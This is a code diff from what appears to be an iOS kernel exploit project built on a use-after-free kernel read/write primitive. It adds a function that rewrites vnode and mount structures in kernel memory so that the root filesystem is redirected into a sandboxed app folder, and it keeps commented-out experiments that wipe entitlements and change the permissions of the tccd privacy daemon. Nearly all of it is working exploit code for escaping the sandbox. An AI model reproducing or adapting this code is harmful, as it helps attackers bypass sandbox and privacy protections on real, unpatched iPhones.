@@ -12,6 +12,22 @@
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 #import <sys/mount.h>
+#include <sys/stat.h>
+#include <sys/attr.h>
+#include <sys/snapshot.h>
+
+struct hfs_mount_args {
+    char    *fspec;            /* block special device to mount */
+    uid_t    hfs_uid;        /* uid that owns hfs files (standard HFS only) */
+    gid_t    hfs_gid;        /* gid that owns hfs files (standard HFS only) */
+    mode_t    hfs_mask;        /* mask to be applied for hfs perms  (standard HFS only) */
+    u_int32_t hfs_encoding;    /* encoding for this volume (standard HFS only) */
+    struct    timezone hfs_timezone;    /* user time zone info (standard HFS only) */
+    int        flags;            /* mounting flags, see below */
+    int     journal_tbuffer_size;   /* size in bytes of the journal transaction buffer */
+    int        journal_flags;          /* flags to pass to journal_open/create */
+    int        journal_disable;        /* don't use journaling (potentially dangerous) */
+};
 
 uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
 {
@@ -151,6 +167,21 @@ int funUcred(u64 kfd, uint64_t proc) {
     uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
     uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
     printf("[i] self ucred->cr_label: 0x%llx\n", cr_label);
+    
+//    printf("[i] self ucred->cr_label+0x8: 0x%llx\n", kread64(kfd, cr_label+0x8));
+//    printf("[i] self ucred->cr_label+0x10: 0x%llx\n", kread64(kfd, cr_label+0x10));
+//    uint64_t OSEntitlements = kread64(kfd, cr_label+0x10);
+//    printf("OSEntitlements: 0x%llx\n", OSEntitlements);
+//    uint64_t CEQueryContext = OSEntitlements + 0x28;
+//    uint64_t der_start = kread64(kfd, CEQueryContext + 0x20);
+//    uint64_t der_end = kread64(kfd, CEQueryContext + 0x28);
+//    for(int i = 0; i < 100; i++) {
+//        printf("OSEntitlements+0x%x: 0x%llx\n", i*8, kread64(kfd, OSEntitlements + i * 8));
+//    }
+//    kwrite64(kfd, kread64(kfd, OSEntitlements), 0);
+//    kwrite64(kfd, kread64(kfd, OSEntitlements + 8), 0);
+//    kwrite64(kfd, kread64(kfd, OSEntitlements + 0x10), 0);
+//    kwrite64(kfd, kread64(kfd, OSEntitlements + 0x20), 0);
     
     uint64_t cr_posix_p = ucreds + 0x18;
     printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
@@ -522,6 +553,45 @@ uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
     
     //mnt_devvp
     kwrite64(kfd, to_v_mount + 0x980, kread64(kfd, from_v_mount + 0x980));
+    //mnt_data
+//    kwrite64(kfd, to_v_mount + 0x8f8, kread64(kfd, from_v_mount + 0x8f8));
+    //mnt_kern_flag
+    kwrite32(kfd, to_v_mount + 0x74, kread32(kfd, from_v_mount + 0x74));
+    //mnt_vfsstat
+    uint64_t from_m_vfsstat = from_v_mount + 0x84;
+    uint64_t to_m_vfsstat = to_v_mount + 0x84;
+    kwrite32(kfd, to_m_vfsstat, kread32(kfd, from_m_vfsstat));
+    kwrite32(kfd, to_m_vfsstat + 0x4, kread32(kfd, from_m_vfsstat + 0x4));
+    kwrite64(kfd, to_m_vfsstat + 0x8, kread32(kfd, from_m_vfsstat + 0x8));
+    kwrite64(kfd, to_m_vfsstat + 0x10, kread32(kfd, from_m_vfsstat + 0x10));
+    kwrite64(kfd, to_m_vfsstat + 0x18, kread32(kfd, from_m_vfsstat + 0x18));
+    kwrite64(kfd, to_m_vfsstat + 0x20, kread32(kfd, from_m_vfsstat + 0x20));
+    kwrite64(kfd, to_m_vfsstat + 0x28, kread32(kfd, from_m_vfsstat + 0x28));
+    kwrite64(kfd, to_m_vfsstat + 0x30, kread32(kfd, from_m_vfsstat + 0x30));
+    
+    //mnt_flag
+    uint32_t from_m_flag = kread32(kfd, from_v_mount + 0x70);
+    uint32_t to_m_flag = kread32(kfd, to_v_mount + 0x70);
+    
+    kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
+    kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
+    
+#define VISHARDLINK     0x100000
+#define MNT_RDONLY      0x00000001
+    kwrite32(kfd, to_vnode+off_vnode_vflags, kread32(kfd, to_vnode+off_vnode_vflags) & (~(0x1<<6)));
+//    kwrite32(kfd, to_v_mount + 0x70, to_m_flag & (~(0x1<<6)));
+    
+    printf("from_m_flag: 0x%x, to_m_flag: 0x%lx\n", from_m_flag, to_m_flag);
+    
+    
+//    uint32_t* p_bsize = (uint32_t*)((uintptr_t)&vfs + 0);
+//        size_t* p_iosize = (size_t*)((uintptr_t)&vfs + 4);
+//        uint64_t* p_blocks = (uint64_t*)((uintptr_t)&vfs + 8);
+//        uint64_t* p_bfree = (uint64_t*)((uintptr_t)&vfs + 16);
+//        uint64_t* p_bavail = (uint64_t*)((uintptr_t)&vfs + 24);
+//        uint64_t* p_bused = (uint64_t*)((uintptr_t)&vfs + 32);
+//        uint64_t* p_files = (uint64_t*)((uintptr_t)&vfs + 40);
+//        uint64_t* p_ffree = (uint64_t*)((uintptr_t)&vfs + 48);
     
 //    kwrite64(kfd, to_vnode + off_vnode_v_data, 0);
 //    sleep(1);
@@ -562,6 +632,67 @@ uint64_t funVnodeOverwriteFile(u64 kfd, char* to, char* from) {
     return 0;
 }
 
+uint64_t funVnodeRedirectFolder(u64 kfd, char* to, char* from) {
+    //16.1.2 offsets
+    uint32_t off_p_pfd = 0xf8;
+    uint32_t off_fd_ofiles = 0;
+    uint32_t off_fp_fglob = 0x10;
+    uint32_t off_fg_data = 0x38;
+    uint32_t off_vnode_iocount = 0x64;
+    uint32_t off_vnode_usecount = 0x60;
+    uint32_t off_vnode_vflags = 0x54;
+    uint32_t off_vnode_v_mount = 0xd8;
+    uint32_t off_vnode_v_data = 0xe0;
+    uint32_t off_vnode_v_kusecount = 0x5c;
+    uint32_t off_vnode_v_references = 0x5b;
+    uint32_t off_vnode_v_parent = 0xc0;
+    uint32_t off_vnode_v_label = 0xe8;
+    uint32_t off_vnode_v_cred = 0x98;
+    uint32_t off_mount_mnt_fsowner = 0x9c0;
+    uint32_t off_mount_mnt_fsgroup = 0x9c4;
+    
+    int file_index = open(to, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    uint64_t proc = getProc(kfd, getpid());
+    
+    //get vnode
+    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
+    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
+    
+    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
+    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
+    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
+    
+    close(file_index);
+    
+    file_index = open(from, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    filedesc = filedesc_pac | 0xffffff8000000000;
+    openedfile = kread64(kfd, filedesc + (8 * file_index));
+    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    fileglob = fileglob_pac | 0xffffff8000000000;
+    vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
+    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
+    
+    close(file_index);
+    
+    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
+    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
+    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
+    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
+    
+    return 0;
+}
+
 int do_fun(u64 kfd) {
     uint64_t kslide = ((struct kfd*)kfd)->perf.kernel_slide;
     uint64_t kbase = 0xfffffff007004000 + kslide;
@@ -591,17 +722,14 @@ int do_fun(u64 kfd) {
     //Restore
     funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
     
-//    NSString *AAAApath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/AAAA.bin"];
-//    remove(AAAApath.UTF8String);
-//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:AAAApath error:nil];
-//
-//    NSString *BBBBpath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/BBBB.bin"];
-//    remove(BBBBpath.UTF8String);
-//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:BBBBpath error:nil];
-    
+    //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
+    //Current: Redirect /var -> NSHomeDirectory(), @"/Documents/mounted"
     NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
     [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
     [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
+    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/");
+    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
+    NSLog(@"/var directory: %@", dirs);
     
 //    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
 //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted/images/BBBB.bin"] error:nil];
@@ -611,11 +739,30 @@ int do_fun(u64 kfd) {
 //    printf("mount ret: %d\n", mount("apfs", mntpath, 0, &mntargs))
 //    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 501, 501);
 //    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 0107777);
-    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/");
-    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath
-                                                                        error:NULL];
-    NSLog(@"/var directory: %@", dirs);
-
+    
+//    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/");
+    
+    
+//    for(NSString *dir in dirs) {
+//        NSString *mydir = [mntPath stringByAppendingString:@"/"];
+//        mydir = [mydir stringByAppendingString:dir];
+//        int fd_open = open(mydir.UTF8String, O_RDONLY);
+//        printf("open %s, ret: %d\n", mydir.UTF8String, fd_open);
+//        if(fd_open != -1) {
+//            NSArray* dirs2 = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mydir error:NULL];
+//            NSLog(@"/var/%@ directory: %@", dir, dirs2);
+//        }
+//        close(fd_open);
+//    }
+//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library"].UTF8String, O_RDONLY));
+//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/containers"].UTF8String, O_RDONLY));
+//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library/Preferences"].UTF8String, O_RDONLY));
+//    printf("open ret: %d\n", open("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches", O_RDONLY));
+    
+//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[mntPath stringByAppendingString:@"/mobile"] error:NULL];
+//    NSLog(@"/var/mobile directory: %@", dirs);
+    
+//    [@"Hello, this is an example file!" writeToFile:[mntPath stringByAppendingString:@"/Hello.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
 //    funVnodeOverwriteFile(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", AAAApath.UTF8String);
 //    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
 //    funVnodeOverwriteFile(kfd, AAAApath.UTF8String, BBBBpath.UTF8String);
